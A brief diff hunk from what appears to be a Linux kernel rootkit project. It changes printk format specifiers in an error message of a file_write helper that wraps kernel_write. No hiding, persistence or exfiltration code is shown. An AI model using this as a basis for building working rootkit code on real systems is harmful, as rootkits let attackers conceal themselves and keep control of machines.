@@ -70,7 +70,7 @@ static int file_write(struct kern_file *file, void *buf, int buf_size){
 	file->pos = 0; //CHECK could be writing to start, but is in append mode so need to check
 	file->ret = kernel_write(file->fp, buf, buf_size*8, &(file->pos)); //writes data to file
 	if (file->ret!=buf_size*8){ //not all bytes writtens
-		printk("[rootkit][files.c::file_write] ERROR    unable to write %i bytes to file: file->ret=%i   buf_size=%i\n", buf_size*8-file->ret, file->ret, buf_size);  //DEBUG
+		printk("[rootkit][files.c::file_write] ERROR    unable to write %ld bytes to file: file->ret=%ld   buf_size=%i\n", buf_size*8-file->ret, file->ret, buf_size);  //DEBUG
 		return buf_size*8-file->ret; //returns number of bytes not written
 	}
 	return 0;
